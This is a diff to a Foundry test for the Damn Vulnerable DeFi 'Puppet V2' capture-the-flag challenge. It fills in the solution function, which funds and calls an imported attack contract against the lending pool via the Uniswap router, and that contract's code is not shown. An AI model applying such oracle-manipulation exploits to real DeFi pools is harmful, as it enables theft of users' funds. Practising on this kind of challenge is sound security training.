@@ -9,6 +9,7 @@ import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUn
 import {WETH} from "solmate/tokens/WETH.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
+import {AttackPuppetV2} from "./AttackPuppetV2.sol";
 
 contract PuppetV2Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -97,7 +98,13 @@ contract PuppetV2Challenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_puppetV2() public checkSolvedByPlayer {}
+    function test_puppetV2() public checkSolvedByPlayer {
+        weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
+        AttackPuppetV2 attackPuppetV2 = new AttackPuppetV2();
+        weth.transfer(address(attackPuppetV2), PLAYER_INITIAL_ETH_BALANCE);
+        token.transfer(address(attackPuppetV2), PLAYER_INITIAL_TOKEN_BALANCE);
+        attackPuppetV2.attack(address(lendingPool), address(uniswapV2Router), address(token), address(weth), recovery);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
